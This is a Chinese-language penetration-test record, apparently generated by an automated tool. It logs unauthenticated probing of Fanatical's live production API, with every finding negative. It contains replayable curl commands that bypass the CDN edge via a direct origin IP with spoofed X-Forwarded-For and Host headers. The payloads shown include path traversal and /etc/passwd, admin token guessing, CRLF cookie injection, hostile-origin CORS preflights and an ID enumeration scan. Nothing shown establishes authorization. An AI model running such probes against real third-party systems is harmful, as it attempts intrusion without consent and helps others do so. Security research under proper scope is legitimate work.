# Fanatical 生产 API 端点参数级实测收口（阴性）：admin/login-as 恒 401、products/download-sample 仅放行 is_sample、key-preview 不校验 key 但仅回公开目录、cookie/set-cookie 仅白名单 cj_eventid

- **code**: fanatical-生产-api-端点参数级实测收口-阴性-admin-login-as-恒-401-products
- **kind**: poc
- **category**: unauthorized
- **component**: Fanatical 生产 API（www 边缘 + ws15 Heroku 源站直连）
- **severity**: low
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 20:00 UTC 本机 Linux curl 8.x（UA=$ARTEX_UA，源站直连连通 3.33.161.45），逐端点双通道实测并存证 EVIDENCE_matrix.txt：login-as 8 种 token 形态两通道均 401/45 同体；download-sample 穿越载荷全 404/23、样本 id 200/574 signedGetUrl、付费文件与下载文档 id 全 404/23、去签名 403；key-preview 有效 id 无 key 200/7243、随机 id 500/30；cookie set-cookie 仅 cj_eventid 下发、evil/null Origin 预检无 ACAO。未取得任何非公开数据或会话。
- **path**: pocs/fanatical-生产-api-端点参数级实测收口-阴性-admin-login-as-恒-401-products/poc.txt
- **tags**: fanatical, api, unauthorized, negative, login-as, download-sample, key-preview, idor, path-traversal, cookie, cors, heroku-origin
- **created_at**: 2026-11-11T20:02:36.941Z
- **engine**: https://www.fanatical.com

## 描述

2026-11-11 对 staging 源码还原出的生产端点做未认证参数级实测，双通道（www 边缘；ws15 源站 --resolve 3.33.161.45 + Host ws15 + X-Forwarded-Host www + 伪造 XFF + 合法 UUIDv4 anonid）。结论全为阴性，勿重复投入。

## 用法

```
复测最小命令（双通道均带 anonid: <UUIDv4>）：
# www 边缘
curl -sg -A "$ARTEX_UA" -H "anonid: $ANON" "https://www.fanatical.com/api/products/key-preview/6ae87ace197317808b3cd6f2/en"      # 200 7243 无 key 也返回
curl -sg -A "$ARTEX_UA" -H "anonid: $ANON" "https://www.fanatical.com/api/admin/login-as/deadbeef"                              # 401/45
curl -sg -A "$ARTEX_UA" -H "anonid: $ANON" "https://www.fanatical.com/api/products/download-sample/6ae87e2b945bbb6718314048"   # 200 signedGetUrl
# ws15 源站直连（必须 --noproxy '*'）
curl -sk --noproxy '*' --resolve ws15.fanatical.com:443:3.33.161.45 -A "$ARTEX_UA" -H 'Host: ws15.fanatical.com' -H 'X-Forwarded-Host: www.fanatical.com' -H 'X-Forwarded-For: 198.51.100.1' -H "anonid: $ANON" "https://ws15.fanatical.com/api/admin/login-as/deadbeef"
证伪条件：若任一端点对随机/穿越载荷出现 200 非公开数据、Set-Cookie 管理会话或与随机 id 差异化敏感回显，则本负面情报不成立。
```

## 正文

```
# 端点级结论（全部实测，证据文件 /opt/artex/data/tasks/5/i2449/EVIDENCE_matrix.txt）

## 1) GET /api/admin/login-as/{token} — 不可用（等有效用户会话）
token=null/undefined/0/1/JWT 形/UUID、Authorization Bearer/裸值/atok Cookie：www 边缘与 ws15 源站一律 401/45B `{"code":401,"error":"User not authenticated"}`；token 为空 → 404/0；.json 后缀 401；POST → 404/167 Express 错误页；全程无 Set-Cookie。鉴权中间件在 token 校验之前，无 atok 无法触达 token 分支。前端源码（chunk_Auth）也要求 authenticated && !isAdminLoggedInAs 才调该接口。

## 2) GET /api/products/download-sample/{fileID} — 不可用（is_sample 闸门有效）
fileID=../ ..%2f %252e%252e%252f 双编码 ..%5c /etc/passwd file:/// samples%2f 随机 UUID → 404/23 `{"message":"Not Found"}`（部分归一化为 404/0）。合法样本：公开商品 /api/products-group/aws-for-solutions-architects/en 的 downloads[1].is_sample=true files[0]._id=6ae87e2b945bbb6718314048 → 200/574 `{"signedGetUrl":"https://fan-dl-lon.lon1.cdn.digitaloceanspaces.com/uploads/a970ac1e...pdf?X-Amz-..."}`；同商品付费 epub/pdf 文件 _id 6ae87b1977c50795a1febc8c / …8d、付费下载文档 _id …8b、样本下载文档 _id …47 → 全 404/23。签名 URL 200/308778B，去签名对象键 403 → 桶私有，无 IDOR/穿越。

## 3) GET /api/products/key-preview/{id}/{lang}?key= — 不校验 key，但无敏感数据
有效已发布商品 id 6ae87ace197317808b3cd6f2：无 key / key= 空 / abc / deadbeef / null 全部 200/7243B 完整商品 JSON；lang=de/fr/xx 及编码穿越串同 200；不存在 id（24hex 随机/全 0）→ 500/30 `{"message":"Unexpected Error"}`（200/500 商品 id 存在性 oracle）。回显是 products-group 公开目录子集（无 base_game/drmEditions/in_bundles/packs/region_locked/related），无任何非公开字段。扫描同批 ObjectId 6ae87ace197317808b3cd600–ff（256 个）仅 6 个商品，全部 draft=false/archive=false 且 products-group 均公开 → 草稿/下架暴露未证实。

## 4) 顺带的匿名可达性
- POST /api/crm/account-lists → 401/0；GET → 404；POST /api/crm/save-lists 任意载荷 → 500/0（匿名即崩，无成功回显）。
- GET /api/crm/get-preference-lists → 200/3727 公开营销订阅分类定义（新公开端点）。
- GET /api/cookie/data-fetch → 200/12596 公开 cookie 政策表（新公开端点）。
- POST /api/cookie/set-cookie → 201；仅 name=cj_eventid 才下发 Set-Cookie（Max-Age/Path/Secure 可控，客户端 options.domain 被接受，实测 Domain=.fanatical.com），其他 name 静默 201 无 cookie；value 始终 URL 编码（encode:false/CRLF 注入无效）；CORS 预检对 evil.example/null 无 ACAO（仅 allow-credentials:true/全方法/Authorization 允许头），text/plain 不解析、form-encoded 对 cj_eventid 500 → 不能跨站利用（新端点，非漏洞）。
- GET /api/wishlist/sync → 404/0（源码证实只是前端路由 redirect）；GET/POST /api/user/recommendations → 401（Missing/Invalid authorization header）；/api/user/long-tail-recommendations → 401。
```
